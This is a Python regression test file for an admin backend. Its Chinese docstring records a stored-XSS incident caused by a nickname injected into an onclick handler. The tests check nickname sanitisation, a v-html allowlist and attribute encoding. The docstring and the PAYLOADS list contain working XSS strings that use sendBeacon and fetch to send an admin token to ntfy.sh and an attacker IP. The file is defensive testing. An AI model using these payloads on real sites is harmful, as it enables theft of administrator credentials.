"""XSS 防护回归：入库侧净化 + 前端渲染面清单。

## 事故（2026-11-02）

攻击者用手机号走**公开自助注册**（`/api/join/*`）把自己 WorkBuddy 账号的昵称填成：

```js
');navigator.sendBeacon('//ntfy.sh/t58',localStorage.wb_admin_token);location='http://<attacker>/admin'//
```

旧控制台账号行把昵称拼进内联处理器：

```js
onclick="growthTasks(55,'${esc(a.name)}')"
```

`esc()` 只做 HTML 实体转义（`& < > "`），**不处理单引号**；而 onclick 属性的值是
「先由 HTML 解析器解码实体、再交给 JS 解析」，所以昵称里的一个 `'` 就能闭合
JS 字符串、跳出参数位执行任意语句，把 localStorage 里的后台令牌外带。
管理员点任意一行的操作按钮即中招。

## 本文件现在守什么

1. `clean_display_name` 在**入库侧**就把元字符剥掉（数据本身不带 payload）；
2. `clean_display_name` 的边界：正常名字 / 空值回落 / 长度上限；
3. `jsv()` 语义：`JSON.stringify` → HTML 转义后，放进属性里仍是一个纯字符串参数
   （Python 复刻断言，不依赖 node）；
4. 新版 Vue 前端的 `v-html` 出现点**必须**在白名单里（新增一处就要过一次 review）。

## 历史（2026-11-27）

旧控制台 `admin/console/` 已随后台前端合并删除，原先读 `console-app.js` /
`agent.js` 的三条断言（`jsv` 存在性、`esc()` 是否转义 `'` 与反引号、
`onclick` 里有几个单引号拼 `esc`）随之失效 —— 那些文件已不存在。对应的防护面
迁移到第 4 条：新版是 Vue 模板（默认转义），唯一的绕过口就是 `v-html`。
"""
from __future__ import annotations

import json
import re
import unittest
from pathlib import Path

from admin.security import clean_display_name

ROOT = Path(__file__).resolve().parents[1]
UI_SRC = ROOT / "admin" / "ui" / "src"

PAYLOADS = [
    "');navigator.sendBeacon('//ntfy.sh/t58',localStorage.wb_admin_token);"
    "location='http://111.170.33.39:89/admin'//",
    '<img src=x onerror="fetch(\'//ntfy.sh/x\',{method:\'POST\',body:token})">',
    "a\\b\"c'd",
]


class CleanDisplayNameTests(unittest.TestCase):
    def test_strips_html_and_js_metacharacters(self):
        for p in PAYLOADS:
            out = clean_display_name(p)
            self.assertIsNone(re.search(r"[<>&\"'`\\]", out), (p, out))
            for ctrl in ("\n", "\r", "\t"):
                self.assertNotIn(ctrl, out)

    def test_keeps_normal_names(self):
        for ok in ("小帆呀", "李帆", "137****8653", "Loomy 2963", "user9904935559005"):
            self.assertEqual(clean_display_name(ok), ok)

    def test_missing_values_fall_back(self):
        for empty in (None, "", "   ", "null", "NULL", "none", "undefined", 123):
            self.assertEqual(clean_display_name(empty, "未命名"), "未命名")

    def test_length_is_capped(self):
        self.assertLessEqual(len(clean_display_name("a" * 500)), 64)


class VueHtmlInjectionTests(unittest.TestCase):
    """`v-html` 是 Vue 里唯一的「跳过转义」口，逐个登记。

    新增一处 `v-html` 就要把它加进白名单 —— 加的时候自然会回答两个问题：
    内容来源是不是外部（用户输入 / 上游响应 / 发布正文）？过了 DOMPurify 吗？
    """

    ALLOWED = {
        # 本地图标资产：内容是随包发布的 SVG body，不来自用户。
        "components/identity/ModelIcon.vue",
        "components/identity/PlatformLogo.vue",
        # Markdown：marked → DOMPurify → v-html（见 AgentPage.vue 文件头）。
        "pages/agent/AgentMessage.vue",
        # 发布公告正文：外部内容，经 maintenance.ts:510 的 DOMPurify 分支。
        "pages/MaintenancePage.vue",
    }

    def test_v_html_only_in_reviewed_components(self):
        if not UI_SRC.is_dir():
            self.skipTest("admin/ui/src 不存在（只跑后端时跳过）")
        found: dict[str, int] = {}
        for path in sorted(UI_SRC.rglob("*.vue")):
            text = path.read_text(encoding="utf-8", errors="replace")
            hits = len(re.findall(r"\bv-html\s*=", text))
            if hits:
                found[path.relative_to(UI_SRC).as_posix()] = hits
        unexpected = {k: v for k, v in found.items() if k not in self.ALLOWED}
        self.assertFalse(
            unexpected,
            "新增了未经 review 的 v-html：%r\n"
            "外部内容必须先过 DOMPurify，然后把它登记进 ALLOWED。" % unexpected,
        )

    def test_agent_markdown_is_sanitized(self):
        """智能体消息是 Markdown + 代码块，最容易被上游内容投毒的渲染点。"""
        page = UI_SRC / "pages" / "AgentPage.vue"
        if not page.is_file():
            self.skipTest("AgentPage.vue 不存在")
        src = page.read_text(encoding="utf-8", errors="replace")
        self.assertIn("DOMPurify", src, "AgentPage 渲染 Markdown 前必须过 DOMPurify")

    def test_release_notes_are_sanitized(self):
        api = UI_SRC / "api" / "maintenance.ts"
        if not api.is_file():
            self.skipTest("api/maintenance.ts 不存在")
        src = api.read_text(encoding="utf-8", errors="replace")
        self.assertIn("DOMPurify", src, "发布公告正文是外部内容，必须过 DOMPurify")


class JsvSemanticsTests(unittest.TestCase):
    """用 Python 复刻「HTML 属性解码 → JS 解析」，验证参数位不会被闭合。

    `jsv()` 的约定：先 `JSON.stringify`，再把 `& < > "` 转成实体。
    这样放进 `onclick="fn(<jsv>)"` 时，HTML 解码后必然是 JSON 字面量，
    内部的双引号已被实体保护过一轮。
    """

    @staticmethod
    def _html_decode(s: str) -> str:
        return (s.replace("&quot;", '"').replace("&#39;", "'")
                 .replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&"))

    @staticmethod
    def _jsv(v: str) -> str:
        return (json.dumps(v, ensure_ascii=False)
                .replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))

    def test_rendered_attribute_stays_a_single_string_argument(self):
        for p in PAYLOADS:
            encoded = self._html_decode(self._jsv(p))
            self.assertTrue(encoded.startswith('"') and encoded.endswith('"'))
            self.assertEqual(json.loads(encoded), p)
            body = encoded[1:-1]
            # 内部不允许出现未转义的双引号把字面量提前闭合
            self.assertIsNone(re.search(r'(?<!\\)"', body))


if __name__ == "__main__":
    unittest.main()
